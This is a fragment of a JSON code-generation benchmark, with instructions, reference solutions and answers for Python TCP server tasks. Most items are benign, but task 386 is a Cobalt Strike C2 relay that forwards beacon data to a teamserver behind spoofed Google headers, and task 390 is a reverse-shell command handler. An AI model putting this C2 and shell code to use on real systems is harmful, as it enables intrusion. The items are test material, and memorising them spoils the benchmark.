    "right_result": "import socket\nimport select\nimport struct\nimport hashlib\nimport hmac\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport time\nimport os\n\nbind_host = '::'\nbind_port = 6668\nreal_key = b'your_real_key_123'\n\nPROTO_SESS_KEY_NEG_START = 0x01\nPROTO_SESS_KEY_NEG_FINISH = 0x02\nPROTO_DP_QUERY_NEW = 0x05\n\nclass TuyaSession:\n    def __init__(self):\n        self.seq_num = 0\n        self.temp_key = None\n        self.session_key = None\n        self.last_active = time.time()\n        self.nonce = None\n\ndef calculate_hmac(key, data):\n    return hmac.new(key, data, hashlib.sha256).digest()\n\ndef decrypt_aes(key, ciphertext):\n    cipher = AES.new(key, AES.MODE_ECB)\n    decrypted = cipher.decrypt(ciphertext)\n    return unpad(decrypted, AES.block_size)\n\ndef encrypt_aes(key, plaintext):\n    cipher = AES.new(key, AES.MODE_ECB)\n    padded = pad(plaintext, AES.block_size)\n    return cipher.encrypt(padded)\n\ndef generate_mock_dp_response():\n    dp_data = b'\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x01\\x01'\n    dp_len = len(dp_data)\n    header = struct.pack('>IIIII', 0x000055AA, 0x00000010, 0x00000000, 0x00000000, dp_len)\n    return header + dp_data\n\ndef main():\n    sessions = {}\n    \n    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((bind_host, bind_port))\n    sock.listen(5)\n    sock.setblocking(False)\n    \n    inputs = [sock]\n    \n    while True:\n        readable, _, exceptional = select.select(inputs, [], inputs, 1.0)\n        \n        for r in readable:\n            if r is sock:\n                client, addr = sock.accept()\n                print(f\"Connection from {addr}\")\n                client.setblocking(False)\n                inputs.append(client)\n                sessions[client] = TuyaSession()\n            else:\n                try:\n                    data = r.recv(4096)\n                    if not data:\n                        print(\"Client disconnected\")\n                        inputs.remove(r)\n                        del sessions[r]\n                        r.close()\n                        continue\n                    \n                    session = sessions[r]\n                    session.last_active = time.time()\n                    \n                    if len(data) < 20:\n                        print(\"Malformed message: too short\")\n                        continue\n                    \n                    proto_version, msg_type, seq, payload_len = struct.unpack_from('>IIII', data, 0)\n                    \n                    if len(data) < 20 + payload_len:\n                        print(\"Malformed message: incomplete payload\")\n                        continue\n                    \n                    payload = data[20:20+payload_len]\n                    hmac_received = data[20+payload_len:20+payload_len+32]\n                    \n                    if msg_type == PROTO_SESS_KEY_NEG_START:\n                        if payload_len != 16:\n                            print(\"Invalid nonce length\")\n                            continue\n                        \n                        session.nonce = payload\n                        enc_nonce = encrypt_aes(real_key, payload)\n                        \n                        response = struct.pack('>IIIII', 0x000055AA, PROTO_SESS_KEY_NEG_FINISH, \n                                             seq, 16, 0x00000000)\n                        response += enc_nonce\n                        \n                        hmac_calc = calculate_hmac(real_key, response[16:] + payload)\n                        response += hmac_calc\n                        \n                        r.sendall(response)\n                        \n                    elif msg_type == PROTO_SESS_KEY_NEG_FINISH:\n                        if payload_len != 48:\n                            print(\"Invalid session key exchange length\")\n                            continue\n                        \n                        encrypted_temp_key = payload[:32]\n                        received_nonce = payload[32:]\n                        \n                        if received_nonce != session.nonce:\n                            print(\"Nonce mismatch\")\n                            continue\n                        \n                        try:\n                            temp_key = decrypt_aes(real_key, encrypted_temp_key)\n                            session.temp_key = temp_key\n                            \n                            response = generate_mock_dp_response()\n                            encrypted = encrypt_aes(temp_key, response)\n                            \n                            header = struct.pack('>IIIII', 0x000055AA, PROTO_DP_QUERY_NEW,\n                                                seq, len(encrypted), 0x00000000)\n                            \n                            hmac_val = calculate_hmac(temp_key, encrypted)\n                            r.sendall(header + encrypted + hmac_val)\n                            \n                        except Exception as e:\n                            print(f\"Decryption failed: {e}\")\n                            \n                    elif msg_type == PROTO_DP_QUERY_NEW:\n                        if not session.temp_key:\n                            print(\"No session key established\")\n                            continue\n                        \n                        calculated_hmac = calculate_hmac(session.temp_key, payload)\n                        if not hmac.compare_digest(hmac_received, calculated_hmac):\n                            print(\"HMAC verification failed\")\n                            continue\n                        \n                        try:\n                            decrypted = decrypt_aes(session.temp_key, payload)\n                            print(f\"Received DP query: {decrypted.hex()}\")\n                            \n                            response = generate_mock_dp_response()\n                            encrypted = encrypt_aes(session.temp_key, response)\n                            \n                            header = struct.pack('>IIIII', 0x000055AA, PROTO_DP_QUERY_NEW,\n                                                seq + 1, len(encrypted), 0x00000000)\n                            \n                            hmac_val = calculate_hmac(session.temp_key, encrypted)\n                            r.sendall(header + encrypted + hmac_val)\n                            \n                        except Exception as e:\n                            print(f\"Decryption failed: {e}\")\n                            \n                    else:\n                        print(f\"Unknown message type: {msg_type}\")\n                        \n                except Exception as e:\n                    print(f\"Error handling client: {e}\")\n                    inputs.remove(r)\n                    del sessions[r]\n                    r.close()\n        \n        current_time = time.time()\n        for client, session in list(sessions.items()):\n            if current_time - session.last_active > 30:\n                print(\"Closing stale connection\")\n                inputs.remove(client)\n                del sessions[client]\n                client.close()"
  },
  {
    "Task_id": 383,
    "Instruction": "Task Description: Implement a TCP server in Python that listens for incoming client connections, accepts a connection, and provides functionality to send messages to the connected client.\n\nFunction Description: The code consists of two functions: `receive_connection` and `send_message`. The `receive_connection` function creates a TCP socket, binds it to a specified port, listens for incoming connections, and returns the connected client socket. The `send_message` function sends a message to the connected client and closes the connection.\n\nInput: \n- `receive_connection`: None\n- `send_message`: \n  - `client`: socket.socket - The connected client socket\n  - `message`: str (optional) - The message to send to the client (default is an empty string)\n\nOutput: \n- `receive_connection`: socket.socket - The connected client socket\n- `send_message`: None",
    "Canonical_solution": "import socket\nimport logging\n\nlogger = logging.getLogger(__name__)\n\ndef receive_connection() -> socket.socket:\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind((\"0.0.0.0\", 7634))\n    logger.log(9, \"Server listening on 0.0.0.0:7634\")\n\n    server.listen(1)\n    client = server.accept()[0]\n    server.close()\n    logger.log(9, \"Server closed\")\n\n    return client\n\ndef send_message(client: socket.socket, message: str = \"\"):\n    client.send(f\"HTTP/1.1 200 OK\\r\\n\\r\\n{message}\".encode(\"utf-8\"))\n    client.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\n\ndef receive_connection():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('localhost', 5000))\n    server_socket.listen(1)\n    client_socket, _ = server_socket.accept()\n    server_socket.close()\n    return client_socket\n\ndef send_message(client, message=''):\n    client.sendall(message.encode())\n    client.close()"
  },
  {
    "Task_id": 385,
    "Instruction": "Task Description: Implement a TCP server and client system in Python using socket programming for handling multiple client connections and echoing received data back to clients.\n\nClass Description: \n\nTCPServer:\nA TCP server class that listens for incoming connections and manages client handlers. It uses socket programming to establish connections and delegates client communication to handler objects.\n\nAttributes:\n- sock: [socket.socket] - The TCP socket object for server operations\n- client_handler: [class] - The handler class to instantiate for each new client\n- handler_list: [list] - List of active client handlers\n\nMethods:\n- __init__(address, client_handler, handler_list) -> [None] - Initializes the server socket, binds to address, and starts listening\n- fileno() -> [int] - Returns the socket's file descriptor for polling\n- wants_to_receive() -> [bool] - Always returns True indicating readiness to accept connections\n- handle_receive() -> [None] - Accepts new connections and adds client handlers to the list\n\nTCPClient:\nBase class for client handlers providing common socket operations and management.\n\nAttributes:\n- sock: [socket.socket] - The client socket object\n- handler_list: [list] - Reference to the server's handler list\n- outgoing: [bytearray] - Buffer for data to be sent\n\nMethods:\n- __init__(sock, handler_list) -> [None] - Initializes client handler with socket and handler list\n- fileno() -> [int] - Returns the socket's file descriptor\n- close() -> [None] - Closes the socket and removes handler from list\n- wants_to_send() -> [bool] - Returns True if there's data to send\n- handle_send() -> [None] - Sends data from outgoing buffer\n\nTCPEchoClient:\nA TCP client handler that echoes received data back to the client.\n\nMethods:\n- wants_to_receive() -> [bool] - Always returns True indicating readiness to receive\n- handle_receive() -> [None] - Receives data and queues it for echoing back, closes connection on empty data",
    "Canonical_solution": "import socket\n\nclass TCPServer:\n    def __init__(self, address, client_handler, handler_list):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n        self.sock.bind(address)\n        self.sock.listen(1)\n        self.client_handler = client_handler\n        self.handler_list = handler_list\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def wants_to_receive(self):\n        return True\n\n    def handle_receive(self):\n        client, addr = self.sock.accept()\n        self.handler_list.append(self.client_handler(client, self.handler_list))\n\nclass TCPClient:\n    def __init__(self, sock, handler_list):\n        self.sock = sock\n        self.handler_list = handler_list\n        self.outgoing = bytearray()\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def close(self):\n        self.sock.close()\n        self.handler_list.remove(self)\n        \n    def wants_to_send(self):\n        return True if self.outgoing else False\n\n    def handle_send(self):\n        nsent = self.sock.send(self.outgoing)\n        self.outgoing = self.outgoing[nsent:]\n\nclass TCPEchoClient(TCPClient):\n    def wants_to_receive(self):\n        return True\n    \n    def handle_receive(self):\n        data = self.sock.recv(8192)\n        if not data:\n            self.close()\n        else:\n            self.outgoing.extend(data)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport select\n\nclass TCPServer:\n    def __init__(self, address, client_handler, handler_list):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind(address)\n        self.sock.listen(5)\n        self.client_handler = client_handler\n        self.handler_list = handler_list\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def wants_to_receive(self):\n        return True\n\n    def handle_receive(self):\n        client_sock, addr = self.sock.accept()\n        handler = self.client_handler(client_sock, self.handler_list)\n        self.handler_list.append(handler)\n\nclass TCPClient:\n    def __init__(self, sock, handler_list):\n        self.sock = sock\n        self.handler_list = handler_list\n        self.outgoing = bytearray()\n\n    def fileno(self):\n        return self.sock.fileno()\n\n    def close(self):\n        self.sock.close()\n        self.handler_list.remove(self)\n\n    def wants_to_send(self):\n        return len(self.outgoing) > 0\n\n    def handle_send(self):\n        n = self.sock.send(self.outgoing)\n        if n:\n            del self.outgoing[:n]\n\nclass TCPEchoClient(TCPClient):\n    def wants_to_receive(self):\n        return True\n\n    def handle_receive(self):\n        data = self.sock.recv(4096)\n        if not data:\n            self.close()\n        else:\n            self.outgoing.extend(data)"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Implement a TCP server that handles client connections, processes incoming data, and interacts with a teamserver through HTTP requests. The server should be able to read and write data based on client requests.\n\nFunction Description: The function `cc2_tcp_server` creates a TCP server that listens for client connections on a specified port. It processes incoming messages to either read data from or write data to a teamserver via HTTP requests. The server handles each client connection in a loop, processing the data and closing the connection afterward.\n\nInput: None (The function binds to a hardcoded IP address and port, and processes incoming client connections.)\n\nOutput: None (The function sends responses to clients but does not return any value.)\n\n---\n\nTask Description: Implement helper functions to support the TCP server's operations, including reading from and writing to a teamserver, parsing raw data, and extracting beacon data.\n\nFunction Description: The function `read_cs_teamserver` sends an HTTP GET request to a teamserver with metadata and extracts beacon data from the response. The function `write_cs_teamserver` sends an HTTP POST request to a teamserver with metadata. The function `parseRawData` splits raw data into a beacon ID and metadata. The function `find_beacon_data` extracts beacon data from a string based on prefix and suffix markers.\n\nInput:\n- `read_cs_teamserver`: `metadata` (str) - The metadata to include in the HTTP GET request.\n- `write_cs_teamserver`: `id` (str) - The beacon ID to include in the HTTP POST request URL; `metadata` (str) - The metadata to include in the HTTP POST request body.\n- `parseRawData`: `rawData` (str) - The raw data string to parse.\n- `find_beacon_data`: `prefix` (str) - The prefix marker for beacon data; `suffix` (str) - The suffix marker for beacon data; `data` (str) - The string to search for beacon data.\n\nOutput:\n- `read_cs_teamserver`: `beacon_data` (str) - The extracted beacon data from the HTTP response.\n- `write_cs_teamserver`: None (The function sends an HTTP POST request but does not return any value.)\n- `parseRawData`: `bid` (str) - The extracted beacon ID; `metadata` (str) - The extracted metadata.\n- `find_beacon_data`: `beacon_data` (str) - The extracted beacon data, or an empty string if not found.",
    "Canonical_solution": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sockobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)\n    sockobj.bind(('127.0.0.1', 7777))\n    sockobj.listen(1000)\n\n    while True:\n        connection, address = sockobj.accept()\n        msgHeader = connection.recv(7)\n        if msgHeader == 'read|||':\n            data = connection.recv(10024)\n            metadata = read_cs_teamserver(data)\n            if len(metadata) > 0:\n                connection.send(metadata)\n        elif msgHeader == 'write||':\n            rawData = connection.recv(10024)\n            bid, metadata = parseRawData(rawData)\n            if len(metadata) > 0 and len(bid) > 0:\n                write_cs_teamserver(bid, metadata)\n        connection.close()\n\ndef read_cs_teamserver(metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_get_send\",\n                \"Cookie\": \"SESSION={}\".format(metadata),\n                \"Connection\": \"cc2_rebind_protocol_get_send\"\n    }\n    res = requests.get(\"http://127.0.0.1:443/aaaaaaaaa\", headers=headers)\n    start = \"ffffffff1\"\n    end = \"eeeeeeee2\"\n    beacon_data = find_beacon_data(start, end, res.content)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_post_send\",\n                \"Connection\": \"keep-alive\",\n                \"Content-Length\": \"{}\".format(len(metadata))\n    }\n    res = requests.post(\"http://127.0.0.1:443/bbbbbbbbb?SESSION={}\".format(id), headers=headers, data=metadata)\n\ndef parseRawData(rawData):\n    split = '->|<-'\n    split_index = rawData.find(split)\n    bid = rawData[:split_index]\n    metadata = rawData[len(split)+split_index:]\n    return bid,metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    s_index = data.find(prefix) + 1\n    s_end = data.find(suffix)\n    beacon_data = ''\n    if (s_index > 0 and s_end > 0 and (s_index + len(prefix) + 1) != s_end:\n        beacon_data = data[s_index + len(prefix):s_end]\n    return beacon_data",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nimport requests\n\ndef cc2_tcp_server():\n    IP = '0.0.0.0'\n    PORT = 4444\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind((IP, PORT))\n    server_socket.listen(5)\n    \n    while True:\n        client_socket, addr = server_socket.accept()\n        threading.Thread(target=handle_client, args=(client_socket,)).start()\n\ndef handle_client(client_socket):\n    try:\n        while True:\n            data = client_socket.recv(1024).decode('utf-8')\n            if not data:\n                break\n            \n            bid, metadata = parseRawData(data)\n            \n            if bid and metadata:\n                if metadata.startswith(\"READ\"):\n                    beacon_data = read_cs_teamserver(metadata)\n                    client_socket.sendall(beacon_data.encode('utf-8'))\n                elif metadata.startswith(\"WRITE\"):\n                    write_cs_teamserver(bid, metadata)\n                    client_socket.sendall(b\"Write successful\")\n                else:\n                    client_socket.sendall(b\"Invalid request type\")\n            else:\n                client_socket.sendall(b\"Malformed request\")\n    finally:\n        client_socket.close()\n\ndef read_cs_teamserver(metadata):\n    URL = \"http://teamserver.example.com/read\"\n    params = {\"meta\": metadata}\n    response = requests.get(URL, params=params)\n    return find_beacon_data(\"<beacon>\", \"</beacon>\", response.text)\n\ndef write_cs_teamserver(id, metadata):\n    URL = f\"http://teamserver.example.com/write/{id}\"\n    data = {\"meta\": metadata}\n    requests.post(URL, data=data)\n\ndef parseRawData(rawData):\n    parts = rawData.strip().split('|', 1)\n    if len(parts) == 2:\n        return parts[0], parts[1]\n    return None, None\n\ndef find_beacon_data(prefix, suffix, data):\n    start = data.find(prefix)\n    if start == -1:\n        return \"\"\n    start += len(prefix)\n    end = data.find(suffix, start)\n    if end == -1:\n        return \"\"\n    return data[start:end].strip()"
  },
  {
    "Task_id": 388,
    "Instruction": "Task Description: Create a Python class that implements a simple network server capable of handling TCP, UDP, and raw socket connections. The server should be able to bind to an available port, receive data from clients, and optionally send a predefined response.\n\nClass Description: The MiniTestServer class provides a configurable network server implementation supporting multiple protocols (TCP, UDP, raw). It can operate in silent mode (receive-only) or respond to clients with predefined data. The server automatically binds to an available port and handles one connection at a time.\n\nAttributes:\n- server_socket: [socket.socket] - The active server socket object\n- received: [bytes] - Data received from the client\n- data_to_send: [bytes] - Predefined data to send to clients (default: b\"\\xfe\\xeb\\xda\\xed\")\n- active_port: [int] - The port number the server is currently bound to\n- stay_silent: [bool] - If True, server won't send responses to clients\n- proto: [str] - Protocol type ('tcp', 'udp', or 'raw')\n- host: [str] - Host address to bind to (default: '0.0.0.0')\n- timeout: [int] - Socket timeout in seconds (default: 5)\n\nMethods:\n- __init__(stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\") -> None - Initializes the server with optional parameters for silent mode, protocol type, and host address\n- bind() -> None - Creates and binds the server socket according to the specified protocol, assigns a random available port\n- serve_once() -> None - Handles one client interaction: accepts connection (TCP), receives data, optionally sends response, then closes the connection",
    "Canonical_solution": "import socket\nimport threading\nimport logging\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = None\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = None\n        self.stay_silent = stay_silent\n        self.proto = proto\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.bind((self.host, 0))\n        self.active_port = self.server_socket.getsockname()[1]\n\n        if self.proto == \"tcp\":\n            self.server_socket.listen(1)\n\n    def serve_once(self):\n        self.server_socket.settimeout(self.timeout)\n\n        if self.proto == \"tcp\":\n            (client_socket, address) = self.server_socket.accept()\n            client_socket.settimeout(self.timeout)\n            self.received = client_socket.recv(10000)\n\n            if not self.stay_silent:\n                client_socket.send(self.data_to_send)\n\n            client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(1024)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data, addr = self.server_socket.recvfrom(10000)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        else:\n            raise Exception(\"Invalid protocol type: '{0}'\".format(self.proto))\n\n        self.server_socket.close()\n        self.server_socket = None\n        self.active_port = None",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport random\n\nclass MiniTestServer:\n    def __init__(self, stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\"):\n        self.server_socket = None\n        self.received = b\"\"\n        self.data_to_send = b\"\\xfe\\xeb\\xda\\xed\"\n        self.active_port = 0\n        self.stay_silent = stay_silent\n        self.proto = proto.lower()\n        self.host = host\n        self.timeout = 5\n\n    def bind(self):\n        if self.proto == \"tcp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n            self.server_socket.bind((self.host, 0))\n            self.server_socket.listen(1)\n        elif self.proto == \"udp\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            self.server_socket.bind((self.host, 0))\n        elif self.proto == \"raw\":\n            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n            self.server_socket.bind((self.host, 0))\n        else:\n            raise ValueError(\"Unsupported protocol\")\n        \n        self.active_port = self.server_socket.getsockname()[1]\n\n    def serve_once(self):\n        if self.proto == \"tcp\":\n            client_socket, _ = self.server_socket.accept()\n            client_socket.settimeout(self.timeout)\n            try:\n                self.received = client_socket.recv(65535)\n                if not self.stay_silent:\n                    client_socket.sendall(self.data_to_send)\n            finally:\n                client_socket.close()\n        elif self.proto == \"udp\":\n            data, addr = self.server_socket.recvfrom(65535)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)\n        elif self.proto == \"raw\":\n            data, addr = self.server_socket.recvfrom(65535)\n            self.received = data\n            if not self.stay_silent:\n                self.server_socket.sendto(self.data_to_send, addr)"
  },
  {
    "Task_id": 389,
    "Instruction": "Task Description: Create a TCP server class that handles incoming client connections, receives data, and writes it to a file, with options for debugging and multiprocessing support.\n\nClass Description: EventGeneric is a TCP server implementation that listens for incoming connections, receives byte data from clients, and writes it to a binary file. It supports running in a separate process and provides debugging capabilities through logging.\n\nAttributes:\n- name: str - Identifier for the event instance and log file\n- isDebug: bool - Flag to enable debug logging\n- shared_key: Any - Optional shared key for inter-process communication\n- port: int - TCP port to listen on (auto-assigned if not specified)\n- addr: str - IP address to bind to (defaults to \"0.0.0.0\")\n- file: str - Path to the output binary file\n- logger: logging.Logger - Debug logger instance (only when isDebug=True)\n\nMethods:\n- __init__(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> None - Initializes the TCP server with optional address, port, name, shared key, and debug flag\n- serve() -> None - Main server loop that binds to the socket, accepts connections, and handles data reception\n- spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> Tuple[int, multiprocessing.Process] - Static method to create and start the server in a separate process, returns the port number and process object",
    "Canonical_solution": "import socket\nimport multiprocessing\nimport os\n\nclass EventGeneric:\n    def __init__(self, addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        if port is None:\n            self.port = get_free_port()\n        else:\n            self.port = port\n        if addr is not None:\n            self.addr, _ = addr\n        else:\n            self.addr = \"0.0.0.0\"\n        self.file = f\"./{self.name}.bin\"\n\n    def serve(self):\n        if self.isDebug:\n            self.logger = get_file_logger(self.name, level=\"DEBUG\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        local_addr_port = (self.addr, self.port)\n        sock.bind(local_addr_port)\n        sock.listen(1)\n\n        try:\n            conn, addr = sock.accept()\n            if self.isDebug:\n                self.logger.debug(f\"Open connection from {addr[0]}:{addr[1]}\")\n                event_file = open(self.file, \"wb\")\n            try:\n                while True:\n                    data = conn.recv(1, socket.MSG_WAITALL)\n                    if data:\n                        event_file.write(data)\n                    else:\n                        break\n                        raise KeyboardInterrupt\n            except KeyboardInterrupt:\n                pass\n            finally:\n                try:\n                    if self.isDebug:\n                        os.remove(self.file)\n                except OSError:\n                    pass\n                conn.close()\n                if self.isDebug:\n                    self.logger.debug(f\"Close connection from {addr[0]}:{addr[1]}\")\n            sock.close()\n        except KeyboardInterrupt:\n            pass\n        except BrokenPipeError:\n            pass\n        finally:\n            sock.close()\n            if self.isDebug:\n                self.logger.debug(f\"Closed listen on {self.addr}:{self.port}\")\n\n    @staticmethod\n    def spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        event = EventGeneric(addr, port, name, shared_key, isDebug)\n        p = multiprocessing.Process(target=event.serve)\n        p.start()\n        return event.port, p",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport logging\nimport multiprocessing\nimport os\nfrom typing import Any, Tuple\n\nclass EventGeneric:\n    def __init__(self, addr=None, port=None, name='events', shared_key=None, isDebug=False):\n        self.name = name\n        self.isDebug = isDebug\n        self.shared_key = shared_key\n        self.port = port if port is not None else 0\n        self.addr = addr if addr is not None else \"0.0.0.0\"\n        self.file = f\"{self.name}_output.bin\"\n        self.logger = None\n        if self.isDebug:\n            logging.basicConfig(level=logging.DEBUG, format=f'%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n            self.logger = logging.getLogger(self.name)\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n    def serve(self):\n        try:\n            self.sock.bind((self.addr, self.port))\n            self.sock.listen(5)\n            actual_port = self.sock.getsockname()[1]\n            if self.isDebug:\n                self.logger.debug(f\"Server {self.name} started on {self.addr}:{actual_port}\")\n            with open(self.file, 'ab') as f:\n                while True:\n                    conn, client_addr = self.sock.accept()\n                    if self.isDebug:\n                        self.logger.debug(f\"Connected by {client_addr}\")\n                    try:\n                        while True:\n                            data = conn.recv(65536)\n                            if not data:\n                                break\n                            f.write(data)\n                            if self.isDebug:\n                                self.logger.debug(f\"Received {len(data)} bytes from {client_addr}\")\n                    finally:\n                        conn.close()\n        except Exception as e:\n            if self.isDebug:\n                self.logger.error(f\"Server error: {e}\")\n            raise\n        finally:\n            self.sock.close()\n\n    @staticmethod\n    def spawn(addr=None, port=None, name='events', shared_key=None, isDebug=False) -> Tuple[int, multiprocessing.Process]:\n        def target():\n            server = EventGeneric(addr, port, name, shared_key, isDebug)\n            server.serve()\n        process = multiprocessing.Process(target=target)\n        process.start()\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)\n        for _ in range(10):\n            try:\n                sock.connect((addr if addr else \"127.0.0.1\", port if port else 0))\n                actual_port = sock.getpeername()[1]\n                sock.close()\n                return (actual_port, process)\n            except Exception:\n                pass\n        process.terminate()\n        raise RuntimeError(\"Failed to start server\")"
  },
  {
    "Task_id": 390,
    "Instruction": "Task Description: Implement a TCP server handler class that manages client connections, receives data from clients, and sends commands to connected clients in a threaded environment.\n\nClass Description: TCPHandler is a threaded TCP server that listens on a specified port, accepts client connections, and facilitates bidirectional communication between the server and client. It runs in a separate thread to maintain responsiveness while handling client connections.\n\nAttributes:\n- connected: bool - Indicates whether a client is currently connected\n- port: int - The port number on which the server listens for connections\n- socket: socket.socket - The TCP socket object for server operations\n- client: socket.socket - The client socket object for an active connection\n\nMethods:\n- __init__(port: int) -> None - Initializes the TCP server thread with the specified port\n- run() -> None - Main thread method that binds the socket, listens for connections, and handles incoming data (overrides threading.Thread.run)\n- listen_command() -> None - Listens for user input from the server console and processes commands\n- send_command(cmd: str) -> None - Sends a command string to the connected client\n- kill() -> None - Closes the client connection and server socket cleanly",
    "Canonical_solution": "import socket\nimport threading\nimport logging\n\nclass TCPHandler(threading.Thread):\n    def __init__(self, port):\n        threading.Thread.__init__(self)\n        logging.info(f\"Handler listening on 0.0.0.0:{port}\")\n        self.connected = False\n        self.port = int(port)\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def run(self):\n        self.socket.bind(('', self.port))\n        self.socket.listen(5)\n        \n        while True:\n            self.client, address = self.socket.accept()\n            print(f\"Handler> New session from {address[0]}\")\n            self.connected = True\n\n            response = self.client.recv(255)\n            while response != b\"\":\n                print(f\"\\n{response.decode('utf_8', 'ignore').strip()}\\nShell > $ \", end='')\n                response = self.client.recv(255)\n\n    def listen_command(self):\n        if self.connected == True:\n            cmd = input(\"Shell> $ \")\n            if cmd == \"exit\":\n                self.kill()\n                print(\"BYE !\")\n                exit()\n            self.send_command(cmd+\"\\n\\n\")\n\n    def send_command(self, cmd):\n        if self.connected:\n            self.client.sendall(cmd.encode())\n\n    def kill(self):\n        if hasattr(self, 'client'):\n            self.client.close()\n        self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "right_result": "import socket\nimport threading\nimport sys\n\nclass TCPHandler(threading.Thread):\n    def __init__(self, port: int) -> None:\n        super().__init__()\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.client = None\n        self.connected = False\n        self.daemon = True\n\n    def run(self) -> None:\n        try:\n            self.socket.bind(('0.0.0.0', self.port))\n            self.socket.listen(1)\n            print(f\"Listening on port {self.port}...\")\n            while True:\n                self.client, addr = self.socket.accept()\n                self.connected = True\n                print(f\"Connection from {addr}\")\n                try:\n                    while self.connected:\n                        data = self.client.recv(1024)\n                        if not data:\n                            break\n                        print(f\"Received: {data.decode('utf-8')}\")\n                except Exception as e:\n                    print(f\"Client communication error: {e}\")\n                finally:\n                    self.connected = False\n                    self.client.close()\n                    self.client = None\n        except Exception as e:\n            print(f\"Server error: {e}\")\n            self.kill()\n\n    def listen_command(self) -> None:\n        try:\n            while True:\n                cmd = input()\n                if cmd.lower() in ['exit', 'quit']:\n                    self.kill()\n                    sys.exit(0)\n                else:\n                    self.send_command(cmd)\n        except KeyboardInterrupt:\n            self.kill()\n            sys.exit(0)\n\n    def send_command(self, cmd: str) -> None:\n        if self.connected and self.client:\n            try:\n                self.client.sendall(cmd.encode('utf-8'))\n            except Exception as e:\n                print(f\"Failed to send command: {e}\")\n                self.connected = False\n                self.client.close()\n                self.client = None\n\n    def kill(self) -> None:\n        self.connected = False\n        if self.client:\n            try:\n                self.client.shutdown(socket.SHUT_RDWR)\n                self.client.close()\n            except:\n                pass\n            self.client = None\n        if self.socket:\n            try:\n                self.socket.shutdown(socket.SHUT_RDWR)\n                self.socket.close()\n            except:\n                pass\n        print(\"Server shutdown complete.\")"
  },
  {
